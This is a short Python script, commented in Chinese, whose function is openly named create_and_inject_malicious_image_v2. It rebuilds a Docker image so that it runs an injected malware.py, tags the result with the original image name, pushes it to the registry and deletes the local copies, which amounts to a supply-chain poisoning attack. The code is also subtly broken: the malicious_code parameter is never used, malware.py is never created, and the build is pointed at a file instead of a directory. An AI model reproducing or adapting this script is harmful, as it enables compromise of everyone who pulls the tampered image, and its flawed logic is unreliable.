import docker
import tempfile

def create_and_inject_malicious_image_v2(image_name, malicious_code):
    client = docker.from_env()
    
    # 建立一個臨時Dockerfile，內容為使用基礎映像和複製惡意程式碼到容器中
    dockerfile_content = f"FROM {image_name}\nCOPY malware.py /malware.py\nCMD python3 /malware.py"
    dockerfile = tempfile.NamedTemporaryFile(mode='w')
    dockerfile.write(dockerfile_content)
    dockerfile.flush()
    
    # 使用臨時Dockerfile建立映像
    infected_image, _ = client.images.build(path=dockerfile.name, tag=image_name)
    
    # Push到映像倉庫
    client.images.push(repository=infected_image.tags[0])
    
    # 刪除臨時Dockerfile和映像
    dockerfile.close()
    client.images.remove(infected_image.id)
    
    return infected_image.tags[0]